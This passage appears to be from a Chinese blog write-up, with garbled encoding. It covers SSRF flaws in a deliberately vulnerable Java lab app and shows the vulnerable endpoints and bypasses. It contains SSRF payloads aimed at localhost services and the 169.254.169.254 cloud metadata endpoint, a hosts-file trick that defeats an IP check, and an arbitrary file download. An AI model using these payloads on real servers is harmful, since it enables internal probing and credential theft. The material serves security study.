<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">HttpURLConnection</span><span class="params">(String url)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">            <span class="type">URLConnection</span> <span class="variable">urlConnection</span> <span class="operator">=</span> u.openConnection();</span><br><span class="line">            <span class="type">HttpURLConnection</span> <span class="variable">conn</span> <span class="operator">=</span> (HttpURLConnection) urlConnection;</span><br><span class="line"><span class="comment">//             conn.setInstanceFollowRedirects(false);</span></span><br><span class="line"><span class="comment">//             Many HttpURLConnection methods can send http request, such as getResponseCode, getHeaderField</span></span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> conn.getInputStream();  <span class="comment">// send request</span></span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(is));</span><br><span class="line">            String inputLine;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">html</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ((inputLine = in.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                html.append(inputLine);</span><br><span class="line">            &#125;</span><br><span class="line">            in.close();</span><br><span class="line">            <span class="keyword">return</span> html.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œç”¨HttpURLConnectionåšäº†å¼ºè½¬ï¼Œé™åˆ¶åªèƒ½ç”¨http&#x2F;htpsåè®®ï¼Œä½†å¯ä»¥è®¿é—®å†…ç½‘å…¶ä»–ä¸»æœº</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272105083.png" alt="image-20250527210533999" loading="lazy"></p>
<p>è®¿é—®åˆ°äº†é¦–é¡µ</p>
<h4 id="3-ssrf-openStream"><a href="#3-ssrf-openStream" class="headerlink" title="3.&#x2F;ssrf&#x2F;openStream"></a>3.&#x2F;ssrf&#x2F;openStream</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/openStream&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">openStream</span><span class="params">(<span class="meta">@RequestParam</span> String url, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">downLoadImgFileName</span> <span class="operator">=</span> WebUtils.getNameWithoutExtension(url) + <span class="string">&quot;.&quot;</span> + WebUtils.getFileExtension(url);</span><br><span class="line">        <span class="comment">// download</span></span><br><span class="line">        response.setHeader(<span class="string">&quot;content-disposition&quot;</span>, <span class="string">&quot;attachment;fileName=&quot;</span> + downLoadImgFileName);</span><br><span class="line"></span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(url);</span><br><span class="line">        <span class="type">int</span> length;</span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        inputStream = u.openStream(); <span class="comment">// send request</span></span><br><span class="line">        outputStream = response.getOutputStream();</span><br><span class="line">        <span class="keyword">while</span> ((length = inputStream.read(bytes)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            outputStream.write(bytes, <span class="number">0</span>, length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        logger.error(e.toString());</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (outputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            outputStream.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡è¿™ä¸ªè·¯ç”±å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼š</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272132329.png" alt="image-20250527213236260" loading="lazy"></p>
<h4 id="4-ssrf-HttpSyncClients-vuln"><a href="#4-ssrf-HttpSyncClients-vuln" class="headerlink" title="4.&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln"></a>4.&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/HttpSyncClients/vuln&quot;)</span></span><br><span class="line">   <span class="keyword">public</span> String <span class="title function_">HttpSyncClients</span><span class="params">(<span class="meta">@RequestParam(&quot;url&quot;)</span> String url)</span> &#123;</span><br><span class="line">       <span class="keyword">return</span> HttpUtils.HttpAsyncClients(url);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥çœ‹HttpAsyncClients</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">HttpAsyncClients</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    <span class="type">CloseableHttpAsyncClient</span> <span class="variable">httpclient</span> <span class="operator">=</span> HttpAsyncClients.createDefault();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        httpclient.start();</span><br><span class="line">        <span class="keyword">final</span> <span class="type">HttpGet</span> <span class="variable">request</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpGet</span>(url);</span><br><span class="line">        Future&lt;HttpResponse&gt; future = httpclient.execute(request, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">HttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> future.get(<span class="number">6000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">        <span class="keyword">return</span> EntityUtils.toString(response.getEntity());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> e.getMessage();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            httpclient.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬å‘ç°æ²¡æœ‰å¯¹urlè¿›è¡Œæ£€æŸ¥ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ssrf</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272138857.png" alt="image-20250527213854753" loading="lazy"></p>
<h4 id="5-ssrf-restTemplate-vuln1"><a href="#5-ssrf-restTemplate-vuln1" class="headerlink" title="5.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1"></a>5.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/restTemplate/vuln1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">RestTemplateUrlBanRedirects</span><span class="params">(String url)</span>&#123;</span><br><span class="line">    <span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">    headers.setContentType(MediaType.APPLICATION_JSON_UTF8);</span><br><span class="line">    <span class="keyword">return</span> httpService.RequestHttpBanRedirects(url, headers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™æ®µä»£ç ä½¿ç”¨ <strong>Spring RestTemplate</strong> æ¥è¿›è¡Œ HTTP è¯·æ±‚ï¼Œå¹¶ç¦æ­¢äº†é‡å®šå‘ï¼Œä½†ä¸å½±å“ç›´æ¥è®¿é—®</p>
<p>æ³¨ï¼šä¸ºä»€ä¹ˆéœ€è¦åŠ ä¸ª&#x2F;login</p>
<p>å› ä¸º<a target="_blank" rel="noopener" href="http://60.205.158.87:8080/%E4%BC%9A%E9%BB%98%E8%AE%A4%E8%B7%B3%E8%BD%AC%E5%88%B0/login%EF%BC%8C%E8%80%8C%E4%BB%A3%E7%A0%81%E7%A6%81%E6%AD%A2%E4%BA%86%E9%87%8D%E5%AE%9A%E5%90%91">http://60.205.158.87:8080/ä¼šé»˜è®¤è·³è½¬åˆ°/loginï¼Œè€Œä»£ç ç¦æ­¢äº†é‡å®šå‘</a></p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505272146502.png" alt="image-20250527214625396" loading="lazy"></p>
<p>æ—¢ç„¶å·²ç»ç¦æ­¢äº†é‡å®šå‘ï¼ˆRedirectï¼‰ï¼Œä¸ºä»€ä¹ˆ SSRF ä»ç„¶å¯èƒ½å‘ç”Ÿï¼Ÿ</p>
<hr>
<p>ä¸€ã€ä»€ä¹ˆæ˜¯ SSRFï¼Ÿ</p>
<p><strong>SSRFï¼ˆServer-Side Request Forgeryï¼‰</strong>ï¼Œå³æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ã€‚æ”»å‡»è€…æ§åˆ¶ä¸€ä¸ªå‚æ•°ï¼Œè®©æœåŠ¡å™¨ä¸»åŠ¨å»è®¿é—®ä¸€ä¸ªç”±ä»–æŒ‡å®šçš„ URLï¼Œä»è€Œè¾¾åˆ°æ¢æµ‹å†…ç½‘ã€æ‰“æ•°æ®åº“ã€è®¿é—®äº‘å…ƒæ•°æ®æœåŠ¡ï¼ˆå¦‚ AWS çš„ <code>169.254.169.254</code>ï¼‰ç­‰ç›®çš„ã€‚</p>
<p><strong>æ ¸å¿ƒé—®é¢˜ï¼šä¸æ˜¯é‡å®šå‘ï¼Œè€Œæ˜¯â€œæœåŠ¡å™¨èƒ½ä¸èƒ½å‘å‡ºè¯·æ±‚â€ã€‚</strong></p>
<hr>
<p>äºŒã€ç¦æ­¢é‡å®šå‘ vs SSRF çš„åŒºåˆ«</p>
<p>ä½ ç¦æ­¢çš„æ˜¯ <strong>HTTP 3xx é‡å®šå‘</strong>ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”¨æˆ·è®¿é—® http://example.com =&gt; è¿”å› 302 Location: http://malicious.com/internal</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™å¦‚æœè‡ªåŠ¨è·Ÿéšé‡å®šå‘ï¼Œå°±ä¼šå»è®¿é—® <code>http://malicious.com/internal</code>ã€‚ç¦ç”¨é‡å®šå‘åªé˜²æ­¢äº†è¿™ç§ <strong>é—´æ¥è·³è½¬ SSRF</strong>ã€‚</p>
<p>âœ… <strong>ç¦æ­¢é‡å®šå‘ç¡®å®é˜²æ­¢äº†è¿™ç§â€œè·³è½¬å‹ SSRFâ€ã€‚</strong></p>
<hr>
<p>ä½†æ˜¯ï¼Œ<strong>æ™®é€š SSRF æ ¹æœ¬ä¸ä¾èµ–é‡å®šå‘ï¼</strong></p>
<p>æ¯”å¦‚ä½ ç›´æ¥è®¿é—®è¿™ä¸ªåœ°å€ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:3306/</span><br><span class="line">http://169.254.169.254/latest/meta-data/</span><br><span class="line">http://localhost:8080/actuator/env</span><br></pre></td></tr></table></figure>

<p>è¿™äº› URL <strong>æ ¹æœ¬ä¸ä¼šè¿”å› 3xx é‡å®šå‘</strong>ï¼Œå®ƒä»¬æ˜¯ç›´æ¥è¯·æ±‚ç›®æ ‡æœåŠ¡ï¼Œè·å–å“åº”ã€‚</p>
<p>åœ¨ä½ å½“å‰çš„ä»£ç ä¸­ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">httpService.RequestHttpBanRedirects(url, headers);</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ”»å‡»è€…ä¼ çš„å°±æ˜¯ä¸€ä¸ªç›´è¿ç›®æ ‡ï¼Œæ¯”å¦‚ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://127.0.0.1:8080/</span><br></pre></td></tr></table></figure>

<p>ä½ ä¸ç®¡é‡å®šå‘ä¸é‡å®šå‘ï¼Œ<strong>è¯·æ±‚éƒ½ä¼šç›´æ¥å‘å‡ºå»</strong>ï¼ŒSSRF å°±å‘ç”Ÿäº†ã€‚</p>
<h4 id="6-ssrf-restTemplate-vuln2"><a href="#6-ssrf-restTemplate-vuln2" class="headerlink" title="6.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2"></a>6.&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/restTemplate/vuln2&quot;)</span></span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">RestTemplateUrl</span><span class="params">(String url)</span>&#123;</span><br><span class="line">     <span class="type">HttpHeaders</span> <span class="variable">headers</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HttpHeaders</span>();</span><br><span class="line">     headers.setContentType(MediaType.APPLICATION_JSON_UTF8);</span><br><span class="line">     <span class="keyword">return</span> httpService.RequestHttp(url, headers);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸²ä»£ç æ²¡æœ‰ç¦æ­¢é‡å®šå‘ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥SSRF</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281929552.png" alt="image-20250528192945371" loading="lazy"></p>
<h4 id="7-ssrf-hutool-vuln"><a href="#7-ssrf-hutool-vuln" class="headerlink" title="7.&#x2F;ssrf&#x2F;hutool&#x2F;vuln"></a>7.&#x2F;ssrf&#x2F;hutool&#x2F;vuln</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/hutool/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">hutoolHttp</span><span class="params">(String url)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> HttpUtil.get(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªåº“ä¹Ÿèƒ½ssrfï¼Œä½†ç¦æ­¢äº†é‡å®šå‘</p>
<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505281948518.png" alt="image-20250528194858386" loading="lazy"></p>
<p>8.&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/dnsrebind/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DnsRebind</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    java.security.Security.setProperty(<span class="string">&quot;networkaddress.cache.negative.ttl&quot;</span> , <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!SecurityUtil.checkSSRFWithoutRedirect(url)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Dangerous url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpUtil.get(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¥çœ‹checkSSRFWithoutRedirect</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * ä¸èƒ½ä½¿ç”¨ç™½åå•çš„æƒ…å†µä¸‹å»ºè®®ä½¿ç”¨è¯¥æ–¹æ¡ˆã€‚å‰ææ˜¯ç¦ç”¨é‡å®šå‘å¹¶ä¸”TTLé»˜è®¤ä¸ä¸º0ã€‚</span></span><br><span class="line"><span class="comment">    * å­˜åœ¨é—®é¢˜ï¼š</span></span><br><span class="line"><span class="comment">    *  1ã€TTLä¸º0ä¼šè¢«ç»•è¿‡</span></span><br><span class="line"><span class="comment">    *  2ã€ä½¿ç”¨é‡å®šå‘å¯ç»•è¿‡</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> url The url that needs to check.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> Safe url returns true. Dangerous url returns false.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkSSRFWithoutRedirect</span><span class="params">(String url)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(url == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !SSRFChecker.isInternalIpByUrl(url);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ¥çœ‹isInternalIpByUrlå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isInternalIpByUrl</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> url2host(url);</span><br><span class="line">        <span class="keyword">if</span> (host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// å¼‚å¸¸URLå½“æˆå†…ç½‘IPç­‰éæ³•URLå¤„ç†</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> host2ip(host);</span><br><span class="line">        <span class="keyword">if</span> (ip.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// å¦‚æœåŸŸåè½¬æ¢ä¸ºIPå¼‚å¸¸ï¼Œåˆ™è®¤ä¸ºæ˜¯éæ³•URL</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ·»åŠ äº†IPæ£€æŸ¥ï¼Œä¿®æ”¹ä¸€ä¸‹dnsè§£æå³å¯ç»•è¿‡ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<p>ç»™æœ¬åœ°çš„hostsæ–‡ä»¶æ·»åŠ ä¸€æ¡è§£æè®°å½•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.43 www.baidu.com</span><br></pre></td></tr></table></figure>



<h4 id="8-ssrf-dnsrebind-vuln"><a href="#8-ssrf-dnsrebind-vuln" class="headerlink" title="8.&#x2F;ssrf&#x2F;dnsrebind&#x2F;vuln"></a>8.&#x2F;ssrf&#x2F;dnsrebind&#x2F;vuln</h4><p>æ¼æ´ä»£ç </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/dnsrebind/vuln&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">DnsRebind</span><span class="params">(String url)</span> &#123;</span><br><span class="line">    java.security.Security.setProperty(<span class="string">&quot;networkaddress.cache.negative.ttl&quot;</span> , <span class="string">&quot;0&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!SecurityUtil.checkSSRFWithoutRedirect(url)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Dangerous url&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> HttpUtil.get(url);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬æ¥çœ‹checkSSRFWithoutRedirectå‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * ä¸èƒ½ä½¿ç”¨ç™½åå•çš„æƒ…å†µä¸‹å»ºè®®ä½¿ç”¨è¯¥æ–¹æ¡ˆã€‚å‰ææ˜¯ç¦ç”¨é‡å®šå‘å¹¶ä¸”TTLé»˜è®¤ä¸ä¸º0ã€‚</span></span><br><span class="line"><span class="comment">    * å­˜åœ¨é—®é¢˜ï¼š</span></span><br><span class="line"><span class="comment">    *  1ã€TTLä¸º0ä¼šè¢«ç»•è¿‡</span></span><br><span class="line"><span class="comment">    *  2ã€ä½¿ç”¨é‡å®šå‘å¯ç»•è¿‡</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> url The url that needs to check.</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> Safe url returns true. Dangerous url returns false.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkSSRFWithoutRedirect</span><span class="params">(String url)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span>(url == <span class="literal">null</span>) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> !SSRFChecker.isInternalIpByUrl(url);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>isInternalIpByUrl</code>å‡½æ•°ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public static boolean isInternalIpByUrl(String url) &#123;</span><br><span class="line"></span><br><span class="line">        String host = url2host(url);</span><br><span class="line">        if (host.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; // å¼‚å¸¸URLå½“æˆå†…ç½‘IPç­‰éæ³•URLå¤„ç†</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String ip = host2ip(host);</span><br><span class="line">        if (ip.equals(&quot;&quot;)) &#123;</span><br><span class="line">            return true; // å¦‚æœåŸŸåè½¬æ¢ä¸ºIPå¼‚å¸¸ï¼Œåˆ™è®¤ä¸ºæ˜¯éæ³•URL</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return isInternalIp(ip);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ·»åŠ äº†IPæ£€æŸ¥ï¼Œä¿®æ”¹ä¸€ä¸‹dnsè§£æå³å¯ç»•è¿‡ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<p>ç»™æœ¬åœ°çš„hostsæ–‡ä»¶æ·»åŠ ä¸€æ¡è§£æè®°å½•ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.43 www.baidu.com</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±å¯ä»¥å®ç°ssrf</p>
<h4 id="ssrfçš„ä¿®å¤ä¸é˜²æŠ¤"><a href="#ssrfçš„ä¿®å¤ä¸é˜²æŠ¤" class="headerlink" title="ssrfçš„ä¿®å¤ä¸é˜²æŠ¤"></a>ssrfçš„ä¿®å¤ä¸é˜²æŠ¤</h4><p>ï¼ˆ1ï¼‰é™åˆ¶åè®®ä½¿ç”¨</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/urlConnection/sec&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">URLConnectionSec</span><span class="params">(String url)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decline not http/https protocol</span></span><br><span class="line">    <span class="keyword">if</span> (!SecurityUtil.isHttp(url)) 